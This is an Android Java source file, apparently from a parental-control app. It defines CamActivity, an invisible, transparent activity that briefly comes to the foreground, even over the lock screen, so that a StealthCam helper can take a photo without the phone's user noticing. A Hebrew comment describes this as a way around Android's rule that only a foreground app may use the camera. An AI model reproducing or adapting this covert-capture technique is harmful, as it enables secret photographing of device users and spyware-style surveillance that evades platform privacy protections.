package com.chaiapps.chasima;

import android.app.Activity;
import android.os.Bundle;
import android.view.WindowManager;

/**
 * 📸 מסך שקוף ובלתי נראה לשנייה-שתיים: אנדרואיד מרשה מצלמה רק כשהאפליקציה "בחזית",
 * אז פותחים אותו, מצלמים, וסוגרים. לא חוסם לחיצות.
 */
public class CamActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        String r = getIntent().getStringExtra("reason");
        final android.os.Handler h = new android.os.Handler(android.os.Looper.getMainLooper());
        h.postDelayed(this::finish, 9000);
        StealthCam.capture(this, r == null ? "parent" : r, () -> h.post(this::finish));
    }

    @Override public void finish() { if (!isFinishing()) { super.finish(); overridePendingTransition(0, 0); } }

    static void snap(android.content.Context c, String reason) {
        try {
            c.startActivity(new android.content.Intent(c, CamActivity.class)
                    .putExtra("reason", reason)
                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK | android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION
                            | android.content.Intent.FLAG_ACTIVITY_MULTIPLE_TASK));
        } catch (Exception e) { StealthCam.capture(c, reason); }
    }
}
